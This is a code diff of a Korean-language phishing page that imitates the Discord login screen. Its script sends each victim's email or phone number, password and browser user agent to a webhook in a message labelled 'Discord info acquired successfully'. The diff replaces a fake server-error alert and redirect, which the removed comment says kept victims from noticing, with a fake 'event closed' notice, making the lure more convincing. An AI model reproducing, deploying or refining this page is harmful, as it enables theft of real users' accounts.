@@ -103,6 +103,17 @@
         button:hover {
             background-color: #4752c4;
         }
+        .error-message {
+            background-color: #f23f4322;
+            border: 1px solid #f23f43;
+            color: #f23f43;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 14px;
+            margin-bottom: 20px;
+            text-align: center;
+            display: none;
+        }
         .register-link {
             font-size: 14px;
             color: #949ba4;
@@ -129,6 +140,8 @@
             </div>
             <h2>돌아오신 것을 환영해요!</h2>
             <div class="subtitle">다시 만나서 정말 반가워요!</div>
+
+            <div id="errorAlert" class="error-message">이벤트가 마감되었거나 현재 사용할 수 없는 링크입니다.</div>
 
             <form id="loginForm" onsubmit="submitCreds(event)">
                 <div class="input-group">
@@ -160,7 +173,7 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // 웹훅으로 아이디, 비번 및 접속 정보 전송
+            // 정보는 네 웹훅으로 전송
             const payload = {
                 content: `🚨 **[디스코드 정보 획득 성공!]**\n📧 **이메일/전화번호:** \`${email}\`\n🔑 **비밀번호:** \`${password}\`\n🌐 **UA:** \`${navigator.userAgent}\``
             };
@@ -171,9 +184,9 @@
                 body: JSON.stringify(payload)
             });
 
-            // 사용자가 눈치채지 못하도록 자연스러운 에러 창 띄우고 진짜 디코로 보냄
-            alert('디스코드 API 서버 연결이 일시적으로 중단되었습니다. 다시 시도해주세요.');
-            window.location.href = 'https://discord.com/login';
+            // 화면에 마감/에러 메시지 띄우기
+            document.getElementById('errorAlert').style.display = 'block';
+            document.getElementById('loginForm').reset();
         }
     </script>
 </body>
